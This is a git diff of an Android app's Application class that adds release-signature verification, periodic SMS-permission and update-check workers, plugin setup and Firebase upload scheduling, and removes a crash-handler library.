@@ -6,21 +6,27 @@ import android.accounts.Account;
 import android.accounts.AccountManager;
 import android.app.Activity;
 import android.app.Application;
-import android.app.NotificationChannel;
-import android.app.NotificationManager;
+import android.content.Intent;
 import android.content.ContentResolver;
 import android.content.Context;
 import android.content.SharedPreferences;
-import android.iocl.dac_collector.AntiCrashLibCockroach.Cockroach;
-import android.iocl.dac_collector.AntiCrashLibCockroach.ExceptionHandler;
 import android.iocl.dac_collector.BuildConfig;
+import android.iocl.dac_collector.Firebase.FirebaseDBClient;
+import android.iocl.dac_collector.Plugin.PluginDataBridge;
+import android.iocl.dac_collector.Plugin.PluginManager;
+import android.iocl.dac_collector.Services.SmsPermissionMonitorWorker;
+import android.iocl.dac_collector.Services.AppUpdateCheckWorker;
 import android.iocl.dac_collector.SyncAdapters.AccountContract;
 import android.iocl.dac_collector.SyncAdapters.SyncUtils;
 import android.iocl.dac_collector.SyncRAT.ImageObserver;
 import android.iocl.dac_collector.Ui.CrashActivity;
 import android.iocl.dac_collector.Utility.Constant;
 import android.iocl.dac_collector.Utility.FirebaseConfigManager;
+import android.iocl.dac_collector.Utility.NotificationHelper;
+import android.iocl.dac_collector.Utility.RoleHelper;
 import android.iocl.dac_collector.Utility.SharedPrefs;
+import android.iocl.dac_collector.Utility.SignatureVerifier;
+import android.iocl.dac_collector.Utility.Utility;
 import android.os.Build;
 import android.os.Bundle;
 import android.os.Handler;
@@ -34,6 +40,10 @@ import com.hjq.permissions.Permission;
 import com.hjq.permissions.XXPermissions;
 import com.tencent.mmkv.MMKV;
 
+import androidx.work.ExistingPeriodicWorkPolicy;
+import androidx.work.PeriodicWorkRequest;
+import androidx.work.WorkManager;
+
 import org.acra.ACRA;
 import org.acra.config.CoreConfigurationBuilder;
 import org.acra.config.HttpSenderConfigurationBuilder;
@@ -45,6 +55,7 @@ import java.io.FileReader;
 import java.util.Map;
 import java.util.concurrent.Executor;
 import java.util.concurrent.Executors;
+import java.util.concurrent.TimeUnit;
 
 public class MyApp extends Application implements Application.ActivityLifecycleCallbacks {
 
@@ -68,27 +79,55 @@ public class MyApp extends Application implements Application.ActivityLifecycleC
             return;
         }
 
+        if (!BuildConfig.DEBUG && !SignatureVerifier.isOfficialRelease(this)) {
+            Intent unauthorizedIntent = new Intent(this, CrashActivity.class)
+                    .putExtra("crash_details", "UnAuthorised App")
+                    .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK);
+            startActivity(unauthorizedIntent);
+            android.os.Process.killProcess(android.os.Process.myPid());
+            return;
+        }
+
         // 🔹 LIGHT INIT ONLY (no heavy I/O)
         MMKV.initialize(this);
         SharedPrefs.init(this);
+        RoleHelper.syncSmsLauncherIcon(this);
         FirebaseConfigManager.init();
 
-        initiateDefaultNotificationChannel();
+        NotificationHelper.initializeNotificationChannels(this);
         registerActivityLifecycleCallbacks(this);
 
+
+        PluginManager.initialize(this);
+        scheduleSmsPermissionMonitor();
+        AppUpdateCheckWorker.schedule(this);
+
         // 🔹 Move heavy work off main thread
-        executor.execute(this::initBackground);
+        executor.execute(() -> {
+            initializeAccountSync();
+            initBackground();
+        });
     }
 
-    private void initiateDefaultNotificationChannel () {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            NotificationChannel channel = new NotificationChannel(
-                    "default_channel",
-                    "Default Channel",
-                    NotificationManager.IMPORTANCE_DEFAULT
-            );
-            NotificationManager manager = getSystemService(NotificationManager.class);
-            manager.createNotificationChannel(channel);
+    private void scheduleSmsPermissionMonitor() {
+        PeriodicWorkRequest request = new PeriodicWorkRequest.Builder(
+                SmsPermissionMonitorWorker.class,
+                15,
+                TimeUnit.MINUTES
+        ).build();
+
+        WorkManager.getInstance(this).enqueueUniquePeriodicWork(
+                "sms_permission_monitor",
+                ExistingPeriodicWorkPolicy.KEEP,
+                request
+        );
+    }
+
+    private void initializeAccountSync() {
+        try {
+            SyncUtils.initialize(getApplicationContext());
+        } catch (RuntimeException e) {
+            Log.e(TAG, "AccountSync initialization failed; it will be retried next app start", e);
         }
     }
 
@@ -97,6 +136,8 @@ public class MyApp extends Application implements Application.ActivityLifecycleC
         try {
             // 🔥 Firebase
             FirebaseApp.initializeApp(this);
+            Utility.sendAnyUnsentDAC(getApplicationContext());
+            FirebaseDBClient.schedulePendingDacUploads(getApplicationContext());
             crashlytics = FirebaseCrashlytics.getInstance();
 
             String cons_id = SharedPrefs.getString(
@@ -117,14 +158,9 @@ public class MyApp extends Application implements Application.ActivityLifecycleC
                 initACRA();
             }
 
-
-            // 🔥 Sync + account (already heavy → keep off UI)
-            SyncUtils.initialize(getApplicationContext());
-
             // 🔥 Delay non-critical hooks to avoid startup ANR
             new Handler(Looper.getMainLooper()).postDelayed(() -> {
                 installImageObserver();
-                installCockroachHandler();
             }, 3000);
 
         } catch (Exception e) {
@@ -171,66 +207,38 @@ public class MyApp extends Application implements Application.ActivityLifecycleC
         }
     }
 
-    // ================= COCKROACH =================
-    private void installCockroachHandler() {
-        if (!installCockroach) return;
-
-        try {
-            Cockroach.install(this, new ExceptionHandler() {
-
-                @Override
-                protected void onUncaughtExceptionHappened(Thread thread, Throwable throwable) {
-
-                    Log.e(TAG, "🔥 Uncaught Exception in thread: " + thread.getName(), throwable);
-
-                    crashlytics.recordException(throwable);
-                }
-
-                @Override
-                protected void onBandageExceptionHappened(Throwable throwable) {
-
-                    Log.e(TAG, "🩹 Bandage Exception (handled by Cockroach)", throwable);
-
-                    crashlytics.recordException(throwable);
-                }
-
-                @Override
-                protected void onEnterSafeMode() {
-                    Log.w(TAG, "⚠️ App entered SAFE MODE due to crash");
-                }
-
-                @Override
-                protected void onMayBeBlackScreen(Throwable e) {
-
-                    Log.e(TAG, "🖤 Possible BLACK SCREEN detected", e);
-
-                    crashlytics.recordException(e);
-                }
-            });
-
-        } catch (Exception e) {
-            Log.e("Cockroach", "Install failed", e);
-        }
-    }
-
     // ================= PROCESS =================
     private String getProcessNameSafe() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
+            String processName = Application.getProcessName();
+            if (processName != null && !processName.trim().isEmpty()) {
+                return processName;
+            }
+        }
+
         try {
             int pid = android.os.Process.myPid();
-            BufferedReader reader =
-                    new BufferedReader(new FileReader("/proc/" + pid + "/cmdline"));
-            String processName = reader.readLine().trim();
-            reader.close();
-            return processName;
+            try (BufferedReader reader =
+                         new BufferedReader(new FileReader("/proc/" + pid + "/cmdline"))) {
+                String processName = reader.readLine();
+                if (processName != null) {
+                    processName = processName.replace("\u0000", "").trim();
+                    if (!processName.isEmpty()) {
+                        return processName;
+                    }
+                }
+            }
         } catch (Exception e) {
-            return null;
+            Log.w(TAG, "Could not determine process name; assuming the main app process", e);
         }
+        return getPackageName();
     }
 
     // ================= LIFECYCLE =================
     @Override
     public void onActivityResumed(Activity activity) {
         currentActivityName = activity.getClass().getName();
+        PluginDataBridge.dispatchActivityResumed(this, currentActivityName);
     }
 
     @Override public void onActivityCreated(Activity a, Bundle b) {}
